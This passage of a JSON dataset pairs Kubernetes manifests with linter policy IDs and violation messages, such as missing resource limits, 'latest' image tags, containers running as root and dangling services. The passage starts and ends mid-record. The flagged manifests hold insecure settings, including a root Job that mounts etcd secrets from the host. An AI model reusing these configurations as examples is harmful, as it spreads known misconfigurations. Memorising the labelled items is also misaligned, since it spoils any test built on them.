    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-snapshotter\" has memory limit 0"
  },
  {
    "id": "10608",
    "manifest_path": "data/manifests/the_stack_sample/sample_4089.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-gce-pd-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: gcp-compute-persistent-disk-csi-driver\n  template:\n    metadata:\n      labels:\n        app: gcp-compute-persistent-disk-csi-driver\n    spec:\n      serviceAccountName: csi-gce-pd-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --feature-gates=Topology=true\n        - --http-endpoint=:22011\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        - --extra-create-metadata\n        - --leader-election\n        - --default-fstype=ext4\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22011\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22012\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=250s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22012\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --http-endpoint=:22013\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --handle-volume-inuse-error=false\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 22013\n          name: http-endpoint\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 1\n          httpGet:\n            path: /healthz/leader-election\n            port: http-endpoint\n          initialDelaySeconds: 10\n          timeoutSeconds: 10\n          periodSeconds: 20\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --metrics-address=:22014\n        - --leader-election\n        - --leader-election-namespace=$(PDCSI_NAMESPACE)\n        - --timeout=300s\n        env:\n        - name: PDCSI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      - name: gce-pd-driver\n        image: gke.gcr.io/gcp-compute-persistent-disk-csi-driver\n        args:\n        - --v=5\n        - --endpoint=unix:/csi/csi.sock\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/cloud-sa/cloud-sa.json\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: cloud-sa-volume\n          readOnly: true\n          mountPath: /etc/cloud-sa\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: cloud-sa-volume\n        secret:\n          secretName: cloud-sa\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gce-pd-driver\" has memory limit 0"
  },
  {
    "id": "10609",
    "manifest_path": "data/manifests/the_stack_sample/sample_4090.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-860\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10610",
    "manifest_path": "data/manifests/the_stack_sample/sample_4090.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-860\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10611",
    "manifest_path": "data/manifests/the_stack_sample/sample_4090.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-860\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10612",
    "manifest_path": "data/manifests/the_stack_sample/sample_4090.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-860\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10613",
    "manifest_path": "data/manifests/the_stack_sample/sample_4090.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-860\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10614",
    "manifest_path": "data/manifests/the_stack_sample/sample_4091.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: web-svc-cip\nspec:\n  selector:\n    app: web\n  type: ClusterIP\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:web])"
  },
  {
    "id": "10615",
    "manifest_path": "data/manifests/the_stack_sample/sample_4092.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/name: metacontroller\n  name: metacontroller\n  namespace: metacontroller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: metacontroller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: metacontroller\n    spec:\n      serviceAccountName: metacontroller\n      containers:\n      - name: metacontroller\n        image: metacontrollerio/metacontroller:v2.0.10\n        command:\n        - /usr/bin/metacontroller\n        args:\n        - --zap-log-level=4\n        - --discovery-interval=20s\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"metacontroller\" does not have a read-only root file system"
  },
  {
    "id": "10616",
    "manifest_path": "data/manifests/the_stack_sample/sample_4092.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/name: metacontroller\n  name: metacontroller\n  namespace: metacontroller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: metacontroller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: metacontroller\n    spec:\n      serviceAccountName: metacontroller\n      containers:\n      - name: metacontroller\n        image: metacontrollerio/metacontroller:v2.0.10\n        command:\n        - /usr/bin/metacontroller\n        args:\n        - --zap-log-level=4\n        - --discovery-interval=20s\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"metacontroller\" not found"
  },
  {
    "id": "10617",
    "manifest_path": "data/manifests/the_stack_sample/sample_4092.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/name: metacontroller\n  name: metacontroller\n  namespace: metacontroller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: metacontroller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: metacontroller\n    spec:\n      serviceAccountName: metacontroller\n      containers:\n      - name: metacontroller\n        image: metacontrollerio/metacontroller:v2.0.10\n        command:\n        - /usr/bin/metacontroller\n        args:\n        - --zap-log-level=4\n        - --discovery-interval=20s\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"metacontroller\" is not set to runAsNonRoot"
  },
  {
    "id": "10618",
    "manifest_path": "data/manifests/the_stack_sample/sample_4092.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/name: metacontroller\n  name: metacontroller\n  namespace: metacontroller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: metacontroller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: metacontroller\n    spec:\n      serviceAccountName: metacontroller\n      containers:\n      - name: metacontroller\n        image: metacontrollerio/metacontroller:v2.0.10\n        command:\n        - /usr/bin/metacontroller\n        args:\n        - --zap-log-level=4\n        - --discovery-interval=20s\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"metacontroller\" has cpu request 0"
  },
  {
    "id": "10619",
    "manifest_path": "data/manifests/the_stack_sample/sample_4092.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/name: metacontroller\n  name: metacontroller\n  namespace: metacontroller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: metacontroller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: metacontroller\n    spec:\n      serviceAccountName: metacontroller\n      containers:\n      - name: metacontroller\n        image: metacontrollerio/metacontroller:v2.0.10\n        command:\n        - /usr/bin/metacontroller\n        args:\n        - --zap-log-level=4\n        - --discovery-interval=20s\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"metacontroller\" has memory limit 0"
  },
  {
    "id": "10620",
    "manifest_path": "data/manifests/the_stack_sample/sample_4093.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: stolon-app-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      name: stolon-app-post-install\n    spec:\n      securityContext:\n        runAsUser: 0\n      containers:\n      - name: post-install\n        image: stolonctl:latest\n        command:\n        - /usr/bin/stolonctl\n        - status\n        - --short\n        env:\n        - name: ETCD_CACERT\n          value: /etc/etcd/secrets/root.cert\n        - name: ETCD_CERT\n          value: /etc/etcd/secrets/etcd.cert\n        - name: ETCD_KEY\n          value: /etc/etcd/secrets/etcd.key\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: ETCD_ENDPOINTS\n          value: $(NODE_NAME):2379\n        volumeMounts:\n        - name: etcd-secrets\n          mountPath: /etc/etcd/secrets\n      volumes:\n      - name: etcd-secrets\n        hostPath:\n          path: /var/state\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "10621",
    "manifest_path": "data/manifests/the_stack_sample/sample_4093.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: stolon-app-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      name: stolon-app-post-install\n    spec:\n      securityContext:\n        runAsUser: 0\n      containers:\n      - name: post-install\n        image: stolonctl:latest\n        command:\n        - /usr/bin/stolonctl\n        - status\n        - --short\n        env:\n        - name: ETCD_CACERT\n          value: /etc/etcd/secrets/root.cert\n        - name: ETCD_CERT\n          value: /etc/etcd/secrets/etcd.cert\n        - name: ETCD_KEY\n          value: /etc/etcd/secrets/etcd.key\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: ETCD_ENDPOINTS\n          value: $(NODE_NAME):2379\n        volumeMounts:\n        - name: etcd-secrets\n          mountPath: /etc/etcd/secrets\n      volumes:\n      - name: etcd-secrets\n        hostPath:\n          path: /var/state\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"post-install\" is using an invalid container image, \"stolonctl:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10622",
    "manifest_path": "data/manifests/the_stack_sample/sample_4093.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: stolon-app-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      name: stolon-app-post-install\n    spec:\n      securityContext:\n        runAsUser: 0\n      containers:\n      - name: post-install\n        image: stolonctl:latest\n        command:\n        - /usr/bin/stolonctl\n        - status\n        - --short\n        env:\n        - name: ETCD_CACERT\n          value: /etc/etcd/secrets/root.cert\n        - name: ETCD_CERT\n          value: /etc/etcd/secrets/etcd.cert\n        - name: ETCD_KEY\n          value: /etc/etcd/secrets/etcd.key\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: ETCD_ENDPOINTS\n          value: $(NODE_NAME):2379\n        volumeMounts:\n        - name: etcd-secrets\n          mountPath: /etc/etcd/secrets\n      volumes:\n      - name: etcd-secrets\n        hostPath:\n          path: /var/state\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"post-install\" does not have a read-only root file system"
  },
  {
    "id": "10623",
    "manifest_path": "data/manifests/the_stack_sample/sample_4093.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: stolon-app-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      name: stolon-app-post-install\n    spec:\n      securityContext:\n        runAsUser: 0\n      containers:\n      - name: post-install\n        image: stolonctl:latest\n        command:\n        - /usr/bin/stolonctl\n        - status\n        - --short\n        env:\n        - name: ETCD_CACERT\n          value: /etc/etcd/secrets/root.cert\n        - name: ETCD_CERT\n          value: /etc/etcd/secrets/etcd.cert\n        - name: ETCD_KEY\n          value: /etc/etcd/secrets/etcd.key\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: ETCD_ENDPOINTS\n          value: $(NODE_NAME):2379\n        volumeMounts:\n        - name: etcd-secrets\n          mountPath: /etc/etcd/secrets\n      volumes:\n      - name: etcd-secrets\n        hostPath:\n          path: /var/state\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"post-install\" is not set to runAsNonRoot"
  },
  {
    "id": "10624",
    "manifest_path": "data/manifests/the_stack_sample/sample_4093.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: stolon-app-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      name: stolon-app-post-install\n    spec:\n      securityContext:\n        runAsUser: 0\n      containers:\n      - name: post-install\n        image: stolonctl:latest\n        command:\n        - /usr/bin/stolonctl\n        - status\n        - --short\n        env:\n        - name: ETCD_CACERT\n          value: /etc/etcd/secrets/root.cert\n        - name: ETCD_CERT\n          value: /etc/etcd/secrets/etcd.cert\n        - name: ETCD_KEY\n          value: /etc/etcd/secrets/etcd.key\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: ETCD_ENDPOINTS\n          value: $(NODE_NAME):2379\n        volumeMounts:\n        - name: etcd-secrets\n          mountPath: /etc/etcd/secrets\n      volumes:\n      - name: etcd-secrets\n        hostPath:\n          path: /var/state\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"post-install\" has cpu request 0"
  },
  {
    "id": "10625",
    "manifest_path": "data/manifests/the_stack_sample/sample_4093.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: stolon-app-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      name: stolon-app-post-install\n    spec:\n      securityContext:\n        runAsUser: 0\n      containers:\n      - name: post-install\n        image: stolonctl:latest\n        command:\n        - /usr/bin/stolonctl\n        - status\n        - --short\n        env:\n        - name: ETCD_CACERT\n          value: /etc/etcd/secrets/root.cert\n        - name: ETCD_CERT\n          value: /etc/etcd/secrets/etcd.cert\n        - name: ETCD_KEY\n          value: /etc/etcd/secrets/etcd.key\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: ETCD_ENDPOINTS\n          value: $(NODE_NAME):2379\n        volumeMounts:\n        - name: etcd-secrets\n          mountPath: /etc/etcd/secrets\n      volumes:\n      - name: etcd-secrets\n        hostPath:\n          path: /var/state\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"post-install\" has memory limit 0"
  },
  {
    "id": "10626",
    "manifest_path": "data/manifests/the_stack_sample/sample_4095.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ui\n  labels:\n    app: ui\nspec:\n  ports:\n  - name: http\n    port: 80\n    targetPort: 80\n  selector:\n    app: ui\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ui])"
  },
  {
    "id": "10627",
    "manifest_path": "data/manifests/the_stack_sample/sample_4098.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: memcached\n  labels:\n    name: memcached\nspec:\n  type: ClusterIP\n  ports:\n  - port: 11211\n    targetPort: 11211\n    protocol: TCP\n  selector:\n    name: memcached\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:memcached])"
  },
  {
    "id": "10628",
    "manifest_path": "data/manifests/the_stack_sample/sample_4099.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: canary-demo\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: http\n    protocol: TCP\n    name: http\n  selector:\n    app: canary-demo\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:canary-demo])"
  },
  {
    "id": "10629",
    "manifest_path": "data/manifests/the_stack_sample/sample_4104.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    module: apicurio-studio-api\n    app: apicurio-studio\n  name: apicurio-studio-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      module: apicurio-studio-api\n  template:\n    metadata:\n      labels:\n        module: apicurio-studio-api\n    spec:\n      containers:\n      - env:\n        - name: APICURIO_DB_CONNECTION_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-db-connection-url\n        - name: APICURIO_DB_DRIVER_NAME\n          value: mysql\n        - name: APICURIO_DB_INITIALIZE\n          value: 'true'\n        - name: APICURIO_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-password\n        - name: APICURIO_DB_TYPE\n          value: mysql5\n        - name: APICURIO_DB_USER_NAME\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-user\n        - name: APICURIO_MICROCKS_API_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-microcks-api-url\n        - name: APICURIO_MICROCKS_CLIENT_ID\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-microcks-client-id\n        - name: APICURIO_MICROCKS_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: apicurio-microcks-client-secret\n        - name: APICURIO_KC_AUTH_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: keycloak-url\n        - name: APICURIO_KC_REALM\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-kc-realm\n        - name: APICURIO_KC_CLIENT_ID\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-kc-client-id\n        - name: APICURIO_UI_HUB_UI_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-ui-hub-ui-url\n        - name: APICURIO_KC_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: apicurio-kc-client-secret\n        - name: APICURIO_SHARE_FOR_EVERYONE\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-ui-feature-share-with-everyone\n        - name: JAVA_TOOL_OPTIONS\n          value: -Djava.net.preferIPv4Stack=true\n        image: apicurio/apicurio-studio-api:0.2.53.Final\n        name: apicurio-studio-api\n        ports:\n        - containerPort: 8080\n      volumes:\n      - name: apicurio-secret\n        secret:\n          secretName: apicurio-secret\n      - name: apicurio-configmap\n        configMap:\n          name: apicurio-configmap\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"apicurio-studio-api\" does not have a read-only root file system"
  },
  {
    "id": "10630",
    "manifest_path": "data/manifests/the_stack_sample/sample_4104.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    module: apicurio-studio-api\n    app: apicurio-studio\n  name: apicurio-studio-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      module: apicurio-studio-api\n  template:\n    metadata:\n      labels:\n        module: apicurio-studio-api\n    spec:\n      containers:\n      - env:\n        - name: APICURIO_DB_CONNECTION_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-db-connection-url\n        - name: APICURIO_DB_DRIVER_NAME\n          value: mysql\n        - name: APICURIO_DB_INITIALIZE\n          value: 'true'\n        - name: APICURIO_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-password\n        - name: APICURIO_DB_TYPE\n          value: mysql5\n        - name: APICURIO_DB_USER_NAME\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-user\n        - name: APICURIO_MICROCKS_API_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-microcks-api-url\n        - name: APICURIO_MICROCKS_CLIENT_ID\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-microcks-client-id\n        - name: APICURIO_MICROCKS_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: apicurio-microcks-client-secret\n        - name: APICURIO_KC_AUTH_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: keycloak-url\n        - name: APICURIO_KC_REALM\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-kc-realm\n        - name: APICURIO_KC_CLIENT_ID\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-kc-client-id\n        - name: APICURIO_UI_HUB_UI_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-ui-hub-ui-url\n        - name: APICURIO_KC_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: apicurio-kc-client-secret\n        - name: APICURIO_SHARE_FOR_EVERYONE\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-ui-feature-share-with-everyone\n        - name: JAVA_TOOL_OPTIONS\n          value: -Djava.net.preferIPv4Stack=true\n        image: apicurio/apicurio-studio-api:0.2.53.Final\n        name: apicurio-studio-api\n        ports:\n        - containerPort: 8080\n      volumes:\n      - name: apicurio-secret\n        secret:\n          secretName: apicurio-secret\n      - name: apicurio-configmap\n        configMap:\n          name: apicurio-configmap\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"apicurio-studio-api\" is not set to runAsNonRoot"
  },
  {
    "id": "10631",
    "manifest_path": "data/manifests/the_stack_sample/sample_4104.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    module: apicurio-studio-api\n    app: apicurio-studio\n  name: apicurio-studio-api\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      module: apicurio-studio-api\n  template:\n    metadata:\n      labels:\n        module: apicurio-studio-api\n    spec:\n      containers:\n      - env:\n        - name: APICURIO_DB_CONNECTION_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-db-connection-url\n        - name: APICURIO_DB_DRIVER_NAME\n          value: mysql\n        - name: APICURIO_DB_INITIALIZE\n          value: 'true'\n        - name: APICURIO_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-password\n        - name: APICURIO_DB_TYPE\n          value: mysql5\n        - name: APICURIO_DB_USER_NAME\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: db-user\n        - name: APICURIO_MICROCKS_API_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-microcks-api-url\n        - name: APICURIO_MICROCKS_CLIENT_ID\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-microcks-client-id\n        - name: APICURIO_MICROCKS_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: apicurio-microcks-client-secret\n        - name: APICURIO_KC_AUTH_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: keycloak-url\n        - name: APICURIO_KC_REALM\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-kc-realm\n        - name: APICURIO_KC_CLIENT_ID\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-kc-client-id\n        - name: APICURIO_UI_HUB_UI_URL\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-ui-hub-ui-url\n        - name: APICURIO_KC_CLIENT_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: apicurio-secret\n              key: apicurio-kc-client-secret\n        - name: APICURIO_SHARE_FOR_EVERYONE\n          valueFrom:\n            configMapKeyRef:\n              name: apicurio-configmap\n              key: apicurio-ui-feature-share-with-everyone\n        - name: JAVA_TOOL_OPTIONS\n          value: -Djava.net.preferIPv4Stack=true\n        image: 